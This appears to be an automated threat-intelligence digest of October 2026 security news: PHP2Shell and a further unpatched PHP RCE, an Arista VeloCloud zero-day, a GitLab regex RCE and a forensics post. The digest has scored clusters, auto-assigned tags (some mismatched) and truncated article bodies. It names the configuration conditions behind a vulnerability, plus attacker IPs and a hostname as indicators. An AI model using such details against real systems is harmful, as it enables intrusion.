- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-115560
- urgency_signals: actively_exploited, no_patch_yet, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure, active_exploitation
- affected_industries: critical_infrastructure
- affected_products: GitLab, AWS
- cve_ids: CVE-2026-115560, CVE-2026-109618, CVE-2026-109619
- urgency_signals: actively_exploited, no_patch_yet, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The PHP security team has shared mitigation measures for a new remote code execution vulnerability that affects systems with non-default configurations and has no patch. [...]
```

#### Full body

```
PHP shares mitigation for new RCE vulnerability with no patch By Sergiu Gatlan October 23, 2026 11:38 AM 0 The PHP security team has shared mitigation measures for a new remote code execution vulnerability that affects systems with non-default configurations and has no patch. PHP is an open-source web development language used by nearly 70% of all websites on the Internet. According to VirusTotal estimates , more than 5.1 million PHP hosts are exposed online, and roughly 3.8 million have at least one port open to attacks. According to a Friday advisory, this security flaw (tracked as CVE-2026-115560) can only be exploited when targeting systems "with an unusual combination of configuration and application code." "An application must set session.serialize_handler to php_binary or php_serialize in its configuration and then switch it to php at runtime with ini_set() before calling session_start(). Session upload progress must also still be enabled," the PHP team explained . "Applications that never change the serialize handler at runtime can keep the feature enabled. Since this setup is unlikely in practice, we are handling it in the regular release cycle and will publish a full advisory for CVE-2026-115560 with the next release." Until a security patch is available, the PHP devs suggested setting session.upload_progress.enabled=0, adding that "If you applied it then, keep it in place and no further action is needed." This mitigation should have already been applied on Wednesday, before patching two other critical RCE vulnerabilities (CVE-2026-109618 and CVE-2026-109619) tracked collectively as PHP2Shell . PHP2Shell flaws now targeted in attacks The PHP security team patched the PHP2Shell vulnerabilities one day after urging admins to prepare to install the updates as soon as they became available. While some proof-of-concept (PoC) code was published before the patches went live, the PHP security team said none were functional. However, multiple cybersecurity companies (including Cloudflare , watchTowr , Previdian , Hadrian , and Patchstack ) detected unsuccessful exploitation attempts before public disclosure, after some details on the PHP2Shell security flaws (including the CVE IDs and mitigation advice provided to some critical infrastructure providers) leaked online . Security researchers at Amazon Threat Intelligence also said that attackers began targeting the PHP2Shell vulnerabilities four days before security patches were released on Wednesday. "The actual payloads and choices in anonymization infrastructure varied, suggesting these were multiple actors. Technical analysis is ongoing, and it's unclear if any of these attempts would have succeeded in real-world systems," said AWS chief information security officer CJ Moses . "PHP2Shell is now seeing broad exploitation attempts in the wild," he added, though it's unclear how many attacks (if any) have succeeded. Dataminr's Threat Research and Cyber Engineering (TRACE) team also said in a Thursday report that "observed activity since vulnerability disclosure remains limited to scanning, fingerprinting, and use of non-working exploits, with no known compromises," but noted that "it remains only a matter of time for working POCs or successful exploitation activity to emerge." Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: PHP ships emergency patches for critical PHP2Shell flaws HPE patches eight max severity RCE and auth bypass AOS flaws GitLab warns of new max severity code execution vulnerability F5 releases out-of-band patches for critical NGINX vulnerabilities Hackers exploit SiteGuard WAF flaw to run commands as admins
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: PHP shares mitigation for new RCE vulnerability with no patch
  - Published: 2026-10-23T15:38:05+00:00
  - Link: https://www.bleepingcomputer.com/news/security/php-shares-mitigation-for-new-and-unpatched-rce-vulnerability/
  - Summary: The PHP security team has shared mitigation measures for a new remote code execution vulnerability that affects systems with non-default configurations and has no patch. [...]

### Cluster 4bfd4cf214 — score 19

- Title: Arista patches new VeloCloud Orchestrator zero-day exploited in attacks
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-22T17:18:22+00:00
- Link: https://www.bleepingcomputer.com/news/security/arista-patches-new-velocloud-orchestrator-zero-day-exploited-in-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor, zero_day
- cve_ids: CVE-2026-114625, CVE-2026-16812, CVE-2026-7473, CVE-2026-93952
- urgency_signals: actively_exploited, emergency_patch, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor, active_exploitation
- cve_ids: CVE-2026-114625, CVE-2026-7473, CVE-2026-16812, CVE-2026-93952
- urgency_signals: actively_exploited, zero_day, emergency_patch
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Arista Networks released security updates to patch an actively exploited zero-day vulnerability affecting VeloCloud Orchestrator (VCO) On-Prem deployments. [...]
```

#### Full body

```
Arista patches new VeloCloud Orchestrator zero-day exploited in attacks By Sergiu Gatlan October 22, 2026 01:18 PM 0 Arista Networks released security updates to patch an actively exploited zero-day vulnerability affecting VeloCloud Orchestrator (VCO) On-Prem deployments. VCO is a web-based management portal that helps administrators configure, monitor, and manage VeloCloud SD-WANs (Software-Defined Wide Area Networks) and associated edge devices. Tracked as CVE-2026-114625 , this critical-severity flaw can allow attackers with basic privileges, access to the VCO web interface, and a valid authenticated session to escalate privileges through low-complexity SQL injection attacks that don't require user interaction. "VeloCloud Orchestrator (VCO) on-prem has a security issue where this issue may allow a remote attacker to access privileged internal functionality and impact the VCO host. Successful exploitation may compromise the confidentiality, integrity, and availability of the orchestrator and data managed by the orchestrator," Arista said . "On an affected system, any authenticated user can gain operator privileges and masquerade as a local 'superuser operator' user. This includes access to functionality that is intended for internal use only and which is not intended to be remotely accessible." The company said it has already patched hosted VCO deployments running version 5.2.3.18 or later, 6.1.3.10 or later, and 6.4.2.12 or later. Until the patches are deployed, Arista advised admins to monitor for connections from known malicious IP addresses, restrict access to the VCO web interface to administrative networks, and review recent administrator activity for unusual changes. Admins are also recommended to review VCO web access logs for suspicious activity, such as requests with unusual URL-like path components, encoded characters, references to local or internal services, and high request rates. The company also warned security teams to block the 74[.]82.197.86 and 38[.]54.50.151 IP addresses, which have been observed during ongoing attacks. "If compromise is suspected, operators should preserve VCO web access logs, backend application logs, system logs, database logs, and relevant file-system timestamps before remediation where operationally feasible," it noted, advising customers to contact the Arista Networks Technical Assistance Center (TAC) for additional assistance. This year, Arista has patched three other actively exploited zero-day flaws ( CVE-2026-7473 in May, CVE-2026-16812 in July, and CVE-2026-93952 in September) affecting Extensible Operating System (EOS) and on-premises VeloCloud Orchestrator deployments. Arista Networks is a Fortune 500 company and one of the largest US corporations by revenue, with over 10,000 customers worldwide. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: Arista patches actively exploited VeloCloud Orchestrator zero-day F5 patches BIG-IP APM zero-day flaw exploited in RCE attacks Magento StyleSmuggler zero-day exploited to deploy Linux backdoor PaperCut releases second emergency patch for exploited flaws PaperCut warns of NG, MF flaw exploited in zero-day attacks
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Arista patches new VeloCloud Orchestrator zero-day exploited in attacks
  - Published: 2026-10-22T17:18:22+00:00
  - Link: https://www.bleepingcomputer.com/news/security/arista-patches-new-velocloud-orchestrator-zero-day-exploited-in-attacks/
  - Summary: Arista Networks released security updates to patch an actively exploited zero-day vulnerability affecting VeloCloud Orchestrator (VCO) On-Prem deployments. [...]

### Cluster 1906b7d782 — score 19

- Title: Critical GitLab Flaw (CVSS 10.0) Could Allow Unauthenticated RCE Across 12 Years of Releases
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-21T18:57:34+00:00
- Link: https://thehackernews.com/2026/10/critical-gitlab-flaw-cvss-100-could.html
- Fetch status: ok
- Member count: 4
- Corroborating source count: 2
- Strong signals: GitLab

#### Cluster taxonomy (union across members)
- affected_products: GitLab
- cve_ids: CVE-2026-110264, CVE-2026-15723, CVE-2026-89078, CVE-2026-93577, CVE-2026-97229
- urgency_signals: critical_cvss, preauth_unauth
- content_type: incident_report, news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_products: GitLab
- cve_ids: CVE-2026-110264, CVE-2026-97229, CVE-2026-93577, CVE-2026-89078, CVE-2026-15723
- urgency_signals: preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
GitLab released fixes on October 21 for a flaw that lets an attacker run code on a self-managed server without logging in, and it affects every version of the software going back to 7.0, released in 2014. The fix matters even for administrators who patched nine days earlier: the October 12 update covered only versions 19.2 and later, and the new fixed versions sit one patch above it, so an
```

#### Full body

```
Critical GitLab Flaw (CVSS 10.0) Could Allow Unauthenticated RCE Across 12 Years of Releases  Swati Khandelwal  Oct 21, 2026 Vulnerability / Software Security GitLab released fixes on October 21 for a flaw that lets an attacker run code on a self-managed server without logging in, and it affects every version of the software going back to 7.0, released in 2014. The fix matters even for administrators who patched nine days earlier: the October 12 update covered only versions 19.2 and later, and the new fixed versions sit one patch above it, so an instance updated then is in range again. The flaw, tracked as CVE-2026-110264 , is rated 10.0 on the CVSS scale, the maximum. GitLab says that, under certain conditions, it could allow an unauthenticated user to run arbitrary code on the server due to an integer overflow during the compilation of a specially crafted regular expression. GitLab has not said what those conditions are. The company reports no sign the flaw has been used in attacks, and it is not listed in the U.S. CISA catalog of known exploited vulnerabilities as of October 22. Only self-managed installations need to act. GitLab.com already runs the fixed version, and GitLab Dedicated tenants on the internal releases 19.3.5-internal0 and 19.4.2-internal0 or later already have the fix. GitLab fixed the flaw in seven versions at once. The table below pairs each release branch with the version that fixes it. If you run Upgrade to 19.5 before 19.5.1 19.5.1 19.4 before 19.4.3 19.4.3 19.3 before 19.3.6 19.3.6 19.2 before 19.2.9 19.2.9 19.1 before 19.1.9 19.1.9 19.0 before 19.0.10 19.0.10 7.0 through 18.11, before 18.11.13 18.11.13 Four of those versions are older than GitLab normally patches. The company's policy covers the current release and the previous two monthly releases, which, as of today, are 19.5, 19.4, and 19.3. GitLab said it backported this fix to 18.11.13, 19.0.10, 19.1.9, and 19.2.9 on top of its standard releases, a step it reserves for severe issues. The reason the flaw reaches so far back is the part of GitLab that failed. The regular-expression compiler is Ruby's built-in engine, called Onigmo, which GitLab ships inside its own packages and patches in its own builds. A weakness in that engine is present wherever GitLab has shipped it, which is every release since 7.0. GitLab also published two detection rules to help self-managed administrators look for exploitation attempts, named "Onigmo native worker crash" and "Org mode render error burst." They are part of the company's open-source TLDR framework , which writes each detection in the Sigma format against GitLab's own application logs. GitLab has not said what preconditions an attacker needs to reach the compiler, so administrators cannot yet rule themselves out by configuration; the fix is the only certain protection, and GitLab's advisory offers no interim workaround. This is the fourth code-execution flaw in GitLab's regular-expression engine that the same researcher, who uses the handle joaxcar, has reported in a month, and the first to reach versions before 19.2. On October 12 , GitLab fixed CVE-2026-97229, also an unauthenticated 10.0 overflow in the regex compiler, in versions 19.2.8, 19.3.5, and 19.4.2. On September 23 , it fixed two more, CVE-2026-93577 and CVE-2026-89078, both rated 9.9 but requiring a logged-in account. The three earlier flaws stopped at version 19.2; this one does not. The October 21 release fixes 11 security issues in all, one critical and the rest high, medium, or low. Two of the others concern authentication. CVE-2026-15723, rated high at 8.2, could allow a logged-in user to take over another account, but only when an administrator has enabled both SAML and LDAP auto-linking. A cache-poisoning flaw in GitLab's OAuth and OpenID Connect endpoints, CVE-2026-112212, rated high at 7.5, could allow an attacker to redirect certain sign-in flows to a server they control in setups that use a shared cache. The upgrade carries a cost
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical GitLab Flaw (CVSS 10.0) Could Allow Unauthenticated RCE Across 12 Years of Releases
  - Published: 2026-10-21T18:57:34+00:00
  - Link: https://thehackernews.com/2026/10/critical-gitlab-flaw-cvss-100-could.html
  - Summary: GitLab released fixes on October 21 for a flaw that lets an attacker run code on a self-managed server without logging in, and it affects every version of the software going back to 7.0, released in 2014. The fix matters even for administrators who patched nine days earlier: the October 12 update covered only versions 19.2 and later, and the new fixed versions sit one patch above it, so an
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: GitLab warns of new max severity code execution vulnerability
  - Published: 2026-10-22T11:41:48+00:00
  - Link: https://www.bleepingcomputer.com/news/security/gitlab-warns-of-new-max-severity-code-execution-vulnerability/
  - Summary: GitLab has released security patches for a maximum-severity Regular Expression Compiler flaw that can let remote attackers run arbitrary code on vulnerable servers. [...]

### Cluster e23a63c743 — score 18

- Title: Mind the (Patch) Gap , Part 3: Analysis with Volexity Volcano, Threat Intel, and MCP
- Source: Volexity (threat_research_primary)
- Published: 2026-10-16T18:27:25+00:00
- Link: https://www.volexity.com/blog/2026/10/16/mind-the-patch-gap-part-3-analysis-with-volexity-volcano-threat-intel-and-mcp/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_products: Apple iOS/macOS
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: zero_day
- affected_products: Apple iOS/macOS
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Last month, Volexity published two blog posts in its Mind the (Patch) Gap series. The series details Volexity’s discovery of multiple Chinese threat actors simultaneously using zero-day exploits in Google […] The post Mind the (Patch) Gap , Part 3: Analysis with Volexity Volcano, Threat Intel, and MCP appeared first on Volexity .
```

#### Full body

```
Memory Forensics Mind the (Patch) Gap , Part 3: Analysis with Volexity Volcano, Threat Intel, and MCP October 16, 2026 Volexity Volcano Team Last month, Volexity published two blog posts in its Mind the (Patch) Gap series. The series details Volexity’s discovery of multiple Chinese threat actors simultaneously using zero-day exploits in Google Chrome and Microsoft Windows in campaigns that, if successful, would download and run malware on an exploited system. Those posts covered technical details of the exploits and malware Volexity observed, along with general detection methods for each case. Behind those findings was one of the most advanced tools in Volexity’s arsenal: Volexity Volcano . Volexity Volcano provides rapid response capabilities and advanced detections across Windows, Linux, and macOS endpoints at enterprise scale. Recent releases integrate with Volexity’s Cyber Threat Intelligence feed for actionable, high-fidelity indicators of compromise (IOCs), and now include a game-changing MCP (Model Context Protocol) server for AI-assisted incident response, threat hunting, and digital forensics. Combined with Volcano’s unrivaled memory, file, and registry forensics, these features expedite investigations like those described in Part 1 and Part 2 of the blog series. In this third installment of the series, Volexity takes a closer look at Volcano and the features that made that work possible. Surge Collect Pro Acquisition To demonstrate, Volexity researchers compromised a virtual machine (VM) with the same zero-day exploit chain and payloads used by UTA0560 as described in Part 1 . After accessing and interacting with the VM, attackers realized the environment was monitored and attempted to clean up and cover their tracks. Volcano’s memory and file acquisition counterpart, Surge Collect Pro , was then used to capture the system’s memory (RAM), system and user registry hives, event logs, USN journal ($UsnJournal), master file table ($MFT), and other key forensic artifacts that Volcano incorporates into its analysis. The data collected by Surge Collect Pro was processed by Volcano, enabling reconstruction of attacker activity and analysis of related artifacts. The sections that follow detail the analysis and findings. Threat Intelligence Feeds Volcano ships with powerful IOCs that automatically bring suspicious artifacts to the analyst’s attention. Out of the box, these IOCs nailed the memory-only components, including reflectively loaded DLLs and position-independent shellcode in chrome.exe . They also triggered on the persistence mechanism and anomalies related to system privileges and invalid parent/child process relationships. Volcano’s Volexity Threat Intel indicator complements the built-in IOCs with real-time lookups of malicious IP addresses, DNS names, and YARA rules from Volexity’s Cyber Threat Intelligence feeds. Volcano users that subscribe to these feeds benefit from advance notice of attacker infrastructure and thorough alerting across all evidence supplied to Volcano. In the example below, the malicious hostname cloud.shinewrist[.]net was detected in event logs and from the command line of the command shells and curl processes. Initial Triage with Volcano’s MCP Since its inception, Volcano was designed to save time by automating analyses, including collection import, memory profile identification, artifact extraction, and IOC scanning. It exposes powerful REST APIs, an OpenAPI specification, and a Python3 SDK for effortless integration with third-party applications and services. With the introduction of Volcano’s new MCP server, this already rapid process reaches new levels of efficiency and automation. AI-assisted investigations also make memory forensics technology more accessible to traditional forensic analysts, SOC operators, and other information security personnel. In the following examples, Volexity analysts used OpenAI’s Codex client with GPT-6.1-Sol to connect to Volcano’s MCP. Other models (public
```

#### Corroborating sources (1)

- **Volexity** (threat_research_primary)
  - Title: Mind the (Patch) Gap , Part 3: Analysis with Volexity Volcano, Threat Intel, and MCP
  - Published: 2026-10-16T18:27:25+00:00
  - Link: https://www.volexity.com/blog/2026/10/16/mind-the-patch-gap-part-3-analysis-with-volexity-volcano-threat-intel-and-mcp/
  - Summary: Last month, Volexity published two blog posts in its Mind the (Patch) Gap series. The series details Volexity’s discovery of multiple Chinese threat actors simultaneously using zero-day exploits in Google […] The post Mind the (Patch) Gap , Part 3: Analysis with Volexity Volcano, Threat Intel, and MCP appeared first on Volexity .

### Cluster 03ad94fad0 — score 18

- Title: PHP Warns of Another Unpatched RCE Risk Two Days After Emergency PHP2Shell Patches
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-23T11:25:43+00:00
- Link: https://thehackernews.com/2026/10/urgent-php-warns-of-another-unpatched.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-115560

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_products: Linux kernel
- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-115560
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_products: Linux kernel
- cve_ids: CVE-2026-115560, CVE-2026-109618, CVE-2026-109619
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
PHP has warned of another way an attacker could run code on a web server, two days after it shipped emergency fixes for the critical PHP2Shell flaws. The new issue, assigned CVE-2026-115560, affects only web applications configured in an unusual way, and PHP considers it an unlikely risk.The project is not issuing an emergency fix for it. Instead, it recommends turning off a feature called
```

#### Full body

```
PHP Warns of Another Unpatched RCE Risk Two Days After Emergency PHP2Shell Patches  Swati Khandelwal  Oct 23, 2026 Vulnerability / Web Security PHP has warned of another way an attacker could run code on a web server, two days after it shipped emergency fixes for the critical PHP2Shell flaws. The new issue, assigned CVE-2026-115560 , affects only web applications configured in an unusual way, and PHP considers it an unlikely risk. The project is not issuing an emergency fix for it. Instead, it recommends turning off a feature called session upload progress until a fix is available in the next routine release. The warning came in a short informational advisory published on October 23. It follows the October 21 emergency release that fixed two critical PHP2Shell flaws, CVE-2026-109618 and CVE-2026-109619 , which let an attacker without an account run code on a server. Those were patched in PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35. The new issue is separate and is not fixed by those releases. Only a narrow setup is at risk. PHP says the problem can occur when a web application does all of the following: sets the session.serialize_handler option to php_binary or php_serialize in its configuration, then changes that option to php while running by calling ini_set(), and makes that change before it calls session_start(). Session upload progress must also still be turned on. An application that never changes the serialize handler while running can leave the feature on and is not exposed through this path. PHP says this setup is unlikely in practice. The action is one line. PHP recommends setting session.upload_progress.enabled=0 until the next routine bugfix release. This is the same setting it already listed as a mitigation in the October 21 advisory for CVE-2026-109619. Anyone who applied it then and left it in place needs to do nothing more for the new issue. Session upload progress is turned on by default and lets an application track the progress of a file upload. Because the setup is uncommon, PHP is handling the fix as part of its regular release cycle rather than as an emergency, and it will publish a full advisory for CVE-2026-115560 with the next release. PHP has not stated which versions are affected, which releases will contain the fix, or a severity score. It also has not said whether the new issue shares a root cause with CVE-2026-109619. No exploitation of CVE-2026-115560 has been reported; the attacks reported since October 21 target the two earlier PHP2Shell flaws. Separately, attempts to exploit the two earlier PHP2Shell flaws have surged. Amazon said its honeypots logged an exploit attempt against CVE-2026-109618 and CVE-2026-109619 on October 17, four days before the flaws were disclosed, and Cloudflare said attempts rose from tens of thousands within 45 minutes of the October 21 disclosure to millions by early October 22. Attackers have tried to use the flaws to install a Mirai botnet variant, according to Sophos and Arctic Wolf. Those attempts have so far failed: Previdian, Wordfence and others report scanning and probing but no confirmed code execution, and researchers say a reliable exploit is proving harder to build than expected. That activity targets the two flaws patched on October 21, not CVE-2026-115560, which has not been reported under attack. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  PHP , Vulnerability , Web Security ⚡ Top Stories This Week Researchers Demonstrate OpenBSD Root Exploit Chaining 37-Year-Old Shared-Memory Bug Critical PwnEscape Linux Kernel Vulnerability Lets Guest VMs Read Host Memory ThreatsDay: Adobe RCE, DNS Wallet Theft, NVIDIA Container Escape, Self-Healing Backdoor + 23 More Citizen Lab Traces Zero-Click Candiru Spyware Infections at Al Jazeera to Targeted Online Ads NGINX Fixes 5 Flaws, Including Possible RCE and a TLS Bug That May Skip Client-Cert C
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: PHP Warns of Another Unpatched RCE Risk Two Days After Emergency PHP2Shell Patches
  - Published: 2026-10-23T11:25:43+00:00
  - Link: https://thehackernews.com/2026/10/urgent-php-warns-of-another-unpatched.html
  - Summary: PHP has warned of another way an attacker could run code on a web server, two days after it shipped emergency fixes for the critical PHP2Shell flaws. The new issue, assigned CVE-2026-115560, affects only web applications configured in an unusual way, and PHP considers it an unlikely risk.The project is not issuing an emergency fix for it. Instead, it recommends turning off a feature called

### Cluster 65f0b10f8b — score 17

- Title: PHP2Shell Exploitation: Two Critical PHP Flaws Explained
- Source: Recorded Future (threat_research_primary)
- Published: 2026-10-21T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/php2shell-vulnerability-exploitation
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Drupal, OpenAI/ChatGPT, WordPress
- cve_ids: CVE-2026-109618, CVE-2026-109619
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_products: WordPress, Drupal, OpenAI/ChatGPT
- cve_ids: CVE-2026-109618, CVE-2026-109619
- urgency_signals: preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Two critical PHP remote code execution flaws (PHP2Shell) are reportedly being exploited. See who’s exposed, how the exploits work, and how to remediate now.
```

#### Full body

```
PHP2Shell Exploitation: Two Critical PHP Flaws Explained Two critical remote code execution vulnerabilities in the PHP engine, CVE-2026-109618 and CVE-2026-109619 (nicknamed “PHP2Shell”), are reportedly being targeted in active exploitation attempts following the leak of technical details ahead of PHP’s October 21, 2026, security release. Because the flaws affect PHP itself rather than a specific application, websites running vulnerable PHP versions may be exposed, including those built on WordPress, Drupal, and Joomla. This post covers PHP’s advisories, exploitation reports, public proof-of-concept exploits, exposure data, and patching guidance, along with details from the TTP Instance Insikt Group® published to customers. Attack Surface Intelligence signatures for CVE-2026-109618 and CVE-2026-109619 are available to Recorded Future customers. Organizations running PHP should patch immediately. The Latest Update Insikt Group has published a TTP Instance for PHP2Shell covering public proof-of-concept (PoC) exploits, observed exploit activity, and recommended mitigations. As of 7 PM UTC on October 21, 2026: Patch status: PHP released fixed versions on October 21, 2026: PHP 8.2.35, 8.3.36, 8.4.27, and 8.5.12. Exploitation status : While there are some reports of emerging exploitation attempts targeting PHP2Shell, the available reporting does not establish the full extent of successful exploitation or confirmed compromises ( 1 , 2 ). PoC status: Publicly available repositories claim to provide PHP2Shell proof-of-concept (PoC) exploits, although their effectiveness and relationship to the confirmed vulnerabilities vary. For example, security researcher J4ck3LSyN published two alleged PoCs but subsequently invalidated the cached-pointer UAF theory underlying their proposed exploitation sequences. How It Started On October 20, 2026, the PHP security team announced an out-of-band security release for October 21 at 14:00 UTC to fix two critical vulnerabilities, both rated 9.2 under CVSS v4.0. PHP initially withheld technical details and affected versions pending coordinated disclosure, warning that the release could be accelerated if vulnerability details leaked or exploitation emerged. Ahead of the scheduled release, watchTowr reported reproducing CVE-2026-109618 and assessed that both vulnerabilities could enable remote code execution (RCE). Technical information subsequently leaked before coordinated disclosure, prompting heightened concern about potential exploitation. PHP shipped the fixes on October 21, alongside a PHP Foundation post about the release, which addressed the emergency release and improvements to PHP's security processes. The “PHP2Shell” name comes from Wiz Research, which found the flaws with Calif and OpenAI and reported them to PHP in August. Wiz’s write-up covers the discovery and root cause in depth. The Vulnerabilities Both CVEs are memory-safety vulnerabilities involving PHP's handling of request memory during initialization, error handling, and cleanup. According to Wiz, out-of-memory (OOM) failures and stale internal state can expose freed or partially initialized memory, potentially enabling memory disclosure, memory corruption, and remote code execution (RCE). CVE-2026-109618: An OOM-related vulnerability involving partially initialized request memory. Wiz identified a use-after-free (UAF) in the session upload-progress unserializer and a related flaw that can disclose PHP worker memory. Wiz demonstrated unauthenticated RCE against WordPress, Drupal, and Joomla. CVE-2026-109619: A stale-state vulnerability involving PHP globals that retain references to freed request memory. Wiz identified a UAF involving fatal-error backtraces and a separate OPcache type-confusion flaw. Wiz demonstrated unauthenticated RCE against Drupal and WordPress. The vulnerabilities affect PHP itself rather than a particular website application. Some exploitation paths involve PHP's session upload-progress functionality, which Vir
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: PHP2Shell Exploitation: Two Critical PHP Flaws Explained
  - Published: 2026-10-21T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/php2shell-vulnerability-exploitation
  - Summary: Two critical PHP remote code execution flaws (PHP2Shell) are reportedly being exploited. See who’s exposed, how the exploits work, and how to remediate now.

### Cluster 5806ce98aa — score 17

- Title: Two critical RCEs in PHP core
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-21T15:10:53+00:00
- Link: https://blog.talosintelligence.com/two-critical-rces-in-php-core/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, ransomware_extortion
- affected_products: Cisco, Drupal, WordPress
- cve_ids: CVE-2026-109618, CVE-2026-109619
- urgency_signals: actively_exploited, no_patch_yet, poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage, active_exploitation
- affected_products: Cisco, Drupal, WordPress
- cve_ids: CVE-2026-109618, CVE-2026-109619
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Two critical remote code execution vulnerabilities in PHP core could have implications across its wider ecosystem. Talos has published a blog to explain what we know so far, and details the Snort coverage available, including rules in the Community Ruleset.
```

#### Full body

```
Two critical RCEs in PHP core By Cisco Talos Wednesday, October 21, 2026 11:10 Threat Advisory Update 10/22: Added section detailing observations of in the wild exploitation and associated IoCs. Cisco Talos is tracking the disclosure of two unauthenticated remote code execution (RCE) flaws in PHP core, dubbed “php2shell”, triggered by a plain HTTP request and exploitable before any application code runs, affecting every PHP build since 5.4. Based on the entities involved in the disclosure, artificial intelligence and associated technologies played a key role in the discovery of these vulnerabilities — yet another example of how these technologies are forcing change across the landscape, most notably on patching processes for organizations because of the wave of vulnerabilities being disclosed. Cisco customers are covered with the Cisco Talos Network Intrusion Prevention (SNORT®) signatures 67359, 67360, and 67375. These rules are also available in the Community Ruleset for open-source customers. Splunk Enterprise Security customers have an Enterprise Security Content Update with detections available. Please refer to the following recommendations, detection, and coverage guidance for more information. Details CVE-2026-109618 and CVE-2026-109619 are both critical vulnerabilities with a CVSS v4.0 score of 9.2. CVE-2026-109618 occurs when out-of-memory handling interrupts PHP while internal request data is only partially initialized. Request cleanup may then treat invalid data as valid. CVE-2026-109619 occurs when a stale internal state is reused after its backing memory has already been freed, before normal initialization resets it. Impact The potential blast radius is enormous and extends across the PHP ecosystem. The vulnerability sits in PHP core, so applications running affected versions — including WordPress, Drupal, Magento, Shopware, WooCommerce, and Laravel, plus PHP sites hosted through cPanel or Plesk — may be exposed. Note that many older branches will no longer receive fixes, so customers are urged to upgrade to a supported version as soon as possible. Talos regularly investigates threat actor exploitation of vulnerabilities. State-sponsored and affiliated threat actors, as well as ransomware and other financially motivated groups, all employ tactics to exploit RCE. Talos assesses that all industries running PHP applications are at risk for exploitation if systems remain unpatched. PHP 8.1 and older are end of life (EOL), and PHP 8.2 security support ends Dec. 31, 2026. Talos’ initial estimates based on open-source intelligence show a significant corpus of PHP systems that will not receive a patch (~50%). If your organization is running PHP 8.1 or older, Talos very strongly advises immediate update to PHP 8.2 or later. There is no patch for PHP 8.1 or older. Talos is actively monitoring the impact of these CVEs and has not seen them being exploited in the wild yet (as of October 21, 2026 14:00 UTC/10:00 a.m. ET). Observed Exploitation Cisco Talos began observing exploitation attempts within hours of the vulnerabilities’ disclosure. So far, most of the activity is scanning, along with some uncoordinated attempts to deliver various payloads. This is expected: scanning or basic exploitation with public proof-of-concept (PoC) code takes far less effort than integrating a vulnerability into an actor’s own tooling. We expect exploitation volume to grow in the coming days, and campaigns to become more sophisticated and coordinated as more capable groups finish updating their tooling and begin deploying it. Recommendations and detection guidance Talos strongly recommends all PHP users to upgrade to the available fixed releases . There are no intermediate or temporary controls that provide comprehensive protection; however, PHP advises that the following measure may reduce exposure to specific attack paths: CVE-2026-109618 Set memory_limit=-1, preferably in a way applications can't override, such as php_admin_value in the FPM
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Two critical RCEs in PHP core
  - Published: 2026-10-21T15:10:53+00:00
  - Link: https://blog.talosintelligence.com/two-critical-rces-in-php-core/
  - Summary: Two critical remote code execution vulnerabilities in PHP core could have implications across its wider ecosystem. Talos has published a blog to explain what we know so far, and details the Snort coverage available, including rules in the Community Ruleset.

